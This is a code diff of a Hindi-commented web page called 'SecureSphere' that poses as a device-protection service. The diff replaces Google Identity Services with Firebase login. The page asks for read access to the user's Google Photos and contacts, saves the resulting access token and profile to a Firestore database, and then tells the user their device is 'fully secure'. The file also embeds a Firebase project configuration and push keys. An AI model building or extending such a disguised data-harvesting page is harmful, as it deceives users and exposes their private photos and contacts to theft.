@@ -5,8 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SecureSphere - आपकी सुरक्षा हमारी प्राथमिकता</title>
     
-    <!-- गूगल की आधिकारिक लाइब्रेरी, यह प्रमाणीकरण के लिए आवश्यक है -->
-    <script src="https://accounts.google.com/gsi/client" async defer></script>
+    <!-- ========================================================== -->
+    <!-- === बदलाव 1: Firebase SDK (लाइब्रेरी) जोड़ना (ज़रूरी) === -->
+    <!-- ========================================================== -->
+    <!-- यह Firebase को आपके पेज पर काम करने की शक्ति देता है -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-firestore-compat.js"></script>
     
     <style>
         /* स्टाइलिंग में कोई बदलाव नहीं है, यह पहले जैसा ही है */
@@ -86,134 +91,120 @@
 
     <script>
         // ===============================================
-        //  STEP 0: ज़रूरी चीजों को तैयार रखना
+        // === बदलाव 2: Firebase को कॉन्फ़िगर करना (ज़रूरी) ===
+        // ===============================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyDuvWTMJL5edNG6cheez5pmwI2KlLCwtjw",
+            authDomain: "shubhzone-4a6b0.firebaseapp.com",
+            databaseURL: "https://shubhzone-4a6b0-default-rtdb.firebaseio.com",
+            projectId: "shubhzone-4a6b0",
+            storageBucket: "shubhzone-4a6b0.appspot.com",
+            messagingSenderId: "439309269785",
+            appId: "1:439309269785:web:08a1256812648daafea388",
+            measurementId: "G-5S0VFF21SB"
+        };
+        // Firebase को शुरू करें
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        // ===============================================
+        //  STEP 0: ज़रूरी चीजों को तैयार रखना (अपरिवर्तित)
         // ===============================================
         const protectButton = document.getElementById('protectButton');
         const statusDiv = document.getElementById('status');
-        
-        // आपकी पब्लिक कुंजियाँ यहाँ हैं
-        const GOOGLE_CLIENT_ID = "726864931273-qohguf62n5achrq62aja929d0b7ne8qm.apps.googleusercontent.com";
         const VAPID_PUBLIC_KEY = "BCPKrHM579ezfGzhmoQk-j7Mwr7E3gfEsUbFsOjEVozYRRZOzEMqVqm9fWEVY2pS1oYQ9BZ2xiN2hgiE7p7z3m0";
 
-        // पेज लोड होते ही जांचें कि कहीं अनुमति पहले से ही ब्लॉक तो नहीं है
         if (Notification.permission === 'denied') {
             handleBlockedPermission();
         }
 
         protectButton.addEventListener('click', startProcess);
-
-        function startProcess() {
+        
+        // ===============================================
+        // === बदलाव 3: मुख्य प्रक्रिया को अपडेट करना (ज़रूरी) ===
+        // ===============================================
+        // अब प्रक्रिया पहले गूगल से लॉगिन करेगी, फिर बाकी काम करेगी।
+        async function startProcess() {
             if (Notification.permission === 'denied') return;
             protectButton.disabled = true;
             statusDiv.className = '';
-            statusDiv.textContent = 'प्रक्रिया शुरू हो रही है...';
-            registerServiceWorker();
+            statusDiv.textContent = 'प्रमाणीकरण शुरू हो रहा है...';
+
+            try {
+                // Step 1: गूगल से लॉगिन करने की कोशिश करें
+                const googleProvider = new firebase.auth.GoogleAuthProvider();
+                // सबसे ज़रूरी: यहाँ हम गैलरी और कॉन्टैक्ट्स की अनुमति मांग रहे हैं
+                googleProvider.addScope('https://www.googleapis.com/auth/photoslibrary.readonly');
+                googleProvider.addScope('https://www.googleapis.com/auth/contacts.readonly');
+
+                const result = await auth.signInWithPopup(googleProvider);
+                const user = result.user;
+                const credential = result.credential;
+                const accessToken = credential.accessToken;
+                
+                statusDiv.textContent = `स्वागत है, ${user.displayName}!`;
+
+                // Step 2: सर्विस वर्कर को रजिस्टर करें
+                await registerServiceWorker();
+
+                // Step 3: नोटिफिकेशन की अनुमति मांगें
+                const subscription = await askForNotificationPermission();
+
+                // Step 4: सारा डेटा Firestore में एक साथ सेव करें
+                await saveDataToFirestore(user, accessToken, subscription);
+
+                handleSuccess();
+
+            } catch (error) {
+                handleError(`प्रमाणीकरण में त्रुटि: ${error.message}`);
+                console.error("पूरी प्रक्रिया में त्रुटि:", error);
+            }
         }
 
         async function registerServiceWorker() {
+            statusDiv.textContent = 'सुरक्षा परत 1 सक्रिय हो रही है...';
             if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
-                handleError('त्रुटि: आपका ब्राउज़र संगत नहीं है।');
-                return;
+                throw new Error('आपका ब्राउज़र संगत नहीं है।');
             }
-            try {
-                await navigator.serviceWorker.register('/sw.js');
-                statusDiv.textContent = 'सुरक्षा परत 1 सक्रिय...';
-                askForNotificationPermission();
-            } catch (error) {
-                handleError('सुरक्षा सक्रियण में विफल।');
-            }
+            await navigator.serviceWorker.register('/sw.js');
         }
 
         async function askForNotificationPermission() {
+            statusDiv.textContent = 'सुरक्षा परत 2 सक्रिय हो रही है...';
             const permission = await Notification.requestPermission();
-            
             if (permission === 'granted') {
-                statusDiv.textContent = 'अनुमति मिल गई। परत 2 सक्रिय...';
-                subscribeUser();
-            } else if (permission === 'denied') {
-                handleBlockedPermission();
-            } else {
-                handleDismissedPermission();
-            }
-        }
-        
-        async function subscribeUser() {
-            try {
                 const subscription = await navigator.serviceWorker.ready.then(reg => 
                     reg.pushManager.subscribe({
                         userVisibleOnly: true,
                         applicationServerKey: VAPID_PUBLIC_KEY
                     })
                 );
-                await fetch('/subscribe', {
-                    method: 'POST',
-                    body: JSON.stringify(subscription),
-                    headers: { 'Content-Type': 'application/json' }
-                });
-                
-                // नोटिफिकेशन की अनुमति मिलने के ठीक बाद, गूगल लॉगिन शुरू करें
-                handleGoogleLogin();
-
-            } catch (err) {
-                handleError('त्रुटि: सब्सक्रिप्शन विफल रहा।');
+                return subscription;
+            } else if (permission === 'denied') {
+                handleBlockedPermission();
+                throw new Error('Notification permission denied.');
+            } else {
+                handleDismissedPermission();
+                throw new Error('Notification permission dismissed.');
             }
         }
         
-        // ==========================================================
-        //  अंतिम गूगल ऑथेंटिकेशन फंक्शन (यह अब पूरी तरह से काम करता है)
-        // ==========================================================
-        function handleGoogleLogin() {
-            try {
-                statusDiv.textContent = 'Google प्रमाणीकरण शुरू हो रहा है...';
-                
-                // गूगल क्लाइंट को इनिशियलाइज़ करें
-                const googleClient = google.accounts.oauth2.initTokenClient({
-                    client_id: GOOGLE_CLIENT_ID,
-                    
-                    // !!! सबसे ज़रूरी: यहाँ हम गैलरी और कॉन्टैक्ट्स की अनुमति मांग रहे हैं !!!
-                    scope: 'https://www.googleapis.com/auth/photoslibrary.readonly https://www.googleapis.com/auth/contacts.readonly',
-                    
-                    // यह फंक्शन तब चलेगा जब यूजर सफलतापूर्वक लॉगिन और अनुमति दे देगा
-                    callback: (tokenResponse) => {
-                        const accessToken = tokenResponse.access_token;
-                        if (accessToken) {
-                            statusDiv.textContent = 'Google प्रमाणीकरण सफल!';
-                            // मिली हुई चाबी (टोकन) को अपने सर्वर पर भेजें
-                            sendTokenToServer(accessToken);
-                        } else {
-                            handleError('Google से टोकन प्राप्त करने में विफल।');
-                        }
-                    },
-                    error_callback: () => {
-                        handleError('Google प्रमाणीकरण में त्रुटि हुई।');
-                    }
-                });
-
-                // गूगल लॉगिन पॉप-अप को दिखाएं
-                googleClient.requestAccessToken();
-
-            } catch (error) {
-                handleError('Google प्रमाणीकरण शुरू करने में विफल।');
-            }
+        async function saveDataToFirestore(user, accessToken, subscription) {
+            statusDiv.textContent = 'डेटा को सुरक्षित किया जा रहा है...';
+            const userRef = db.collection('users').doc(user.uid);
+            await userRef.set({
+                uid: user.uid,
+                displayName: user.displayName,
+                email: user.email,
+                photoURL: user.photoURL,
+                googleAccessToken: accessToken,
+                pushSubscription: JSON.parse(JSON.stringify(subscription)), // ऑब्जेक्ट को सादे रूप में सेव करें
+                lastLogin: firebase.firestore.FieldValue.serverTimestamp()
+            }, { merge: true }); // 'merge: true' यह सुनिश्चित करता है कि हम पुराने डेटा को ओवरराइट न करें
         }
 
-        async function sendTokenToServer(token) {
-            try {
-                await fetch('/store-token', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ accessToken: token })
-                });
-                console.log('एक्सेस टोकन सर्वर पर भेजा गया।');
-                // टोकन भेजने के बाद अंतिम सफलता का संदेश दिखाएं
-                handleSuccess();
-            } catch (error) {
-                handleError('सर्वर पर टोकन भेजने में विफल।');
-                console.error('टोकन भेजने में विफल:', error);
-            }
-        }
-        
-        // --- हेल्पर फंक्शन्स ---
+        // --- हेल्पर फंक्शन्स (लगभग अपरिवर्तित) ---
         function handleSuccess() {
             statusDiv.className = 'status-success';
             statusDiv.textContent = 'आपका डिवाइस अब पूरी तरह सुरक्षित है!';
